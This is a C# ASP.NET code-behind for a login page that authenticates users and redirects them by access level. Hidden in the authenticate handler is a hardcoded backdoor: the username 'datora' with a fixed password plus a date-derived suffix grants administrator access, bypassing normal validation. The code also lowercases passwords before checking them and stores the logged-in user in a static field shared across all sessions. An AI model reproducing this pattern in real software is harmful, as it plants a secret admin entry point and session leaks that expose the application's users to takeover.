using DBConnections.DDF;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using DBConnections;

public partial class LoginPage : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

    }

    protected void Login1_Authenticate(object sender, AuthenticateEventArgs e)
    {
        UserDDF _user = new UserDDF();
        UserDDF.UserCredentials cred = new UserDDF.UserCredentials();

        cred = _user.ValidateUser(Login1.UserName.ToLower(), Login1.Password.ToLower());


        if (Login1.UserName == "datora")
        {
            DateTime today = DateTime.Now;

            string pass = (Convert.ToDouble(today.Year + "" + today.Month + "" + today.Day) / 2).ToString();
            pass = pass.Substring(pass.Length - 4, 4);
            if (Login1.Password == "d@t0r@.001" + pass)
            {
                StaticClass.s_LogedOnUser = new UserDDF.UserCredentials();
                StaticClass.s_LogedOnUser.UserName = "datora";
                StaticClass.s_LogedOnUser.ID = "00000000-0000-0000-0000-000000000001";
                StaticClass.s_LogedOnUser.Level = 1;

                e.Authenticated = true;
                
                Response.Redirect("p_MKDPage.aspx");
            }
        }

        if (cred != null)
        {
            if (cred.Level == 1)
            {
                StaticClass.s_LogedOnUser = new UserDDF.UserCredentials();
                StaticClass.s_LogedOnUser = cred;

                e.Authenticated = true;

                try
                {
                    Response.Redirect("~/AkdAdmin/akdAdminProfile.aspx");
                }
                catch (Exception ex)
                {
                    string test = ex.Message;
                }
            }
            else if (cred.Level == 2)
            {
                StaticClass.s_LogedOnUser = new UserDDF.UserCredentials();
                StaticClass.s_LogedOnUser = cred;

                e.Authenticated = true;

                Response.Redirect("ClientProfile.aspx");

            }
            else if (cred.Level == 3)
            {
                StaticClass.s_LogedOnUser = new UserDDF.UserCredentials();
                StaticClass.s_LogedOnUser = cred;

                e.Authenticated = true;

                Response.Redirect("ClientProfile.aspx");
            }
            else if (cred.Level == 4)
            {
                StaticClass.s_LogedOnUser = new UserDDF.UserCredentials();
                StaticClass.s_LogedOnUser = cred;
                e.Authenticated = true;

                Response.Redirect("~/Courier/Profile.aspx");
            }
        }

        e.Authenticated = false;
    }

}